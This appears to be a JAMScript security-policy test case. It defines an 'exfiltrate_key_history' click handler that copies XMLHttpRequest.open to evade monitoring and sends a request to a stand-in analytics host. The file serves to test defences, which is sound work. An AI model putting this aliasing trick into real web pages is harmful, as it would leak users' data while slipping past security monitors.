
JAM.startProfile('load');
introspect(JAMScript.introspectors.processAll) {
function copy(obj$$16) {
  if(typeof obj$$16 !== "object") {
    return obj$$16
  }else {
    var value$$29 = obj$$16.valueOf();
    if(obj$$16 != value$$29) {
      return new obj$$16.constructor(value$$29)
    }else {
      if(obj$$16 instanceof obj$$16.constructor && obj$$16.constructor !== Object) {
        var c = clone(obj$$16.constructor.prototype);
        var property$$3;
        for(property$$3 in obj$$16) {
          if(obj$$16.hasOwnProperty(property$$3)) {
            c[property$$3] = copy(obj$$16[property$$3])
          }
        }
      }else {
        c = {};
        for(property$$3 in obj$$16) {
          c[property$$3] = copy(obj$$16[property$$3])
        }
      }
      return c
    }
  }
}
function Clone() {
}
function clone(obj$$17) {
  Clone.prototype = obj$$17;
  return new Clone
}
function exfiltrate_key_history() {
  xmlhttp = new XMLHttpRequest;
  xmlhttp.opennew = copy(xmlhttp.open);
  xmlhttp.opennew("GET", "http://AnalyticsInc:8000/submission.html?test=clone5", true);
  xmlhttp.send(null)
}
document.getElementById("test").onclick = exfiltrate_key_history;

}

JAM.stopProfile('load');
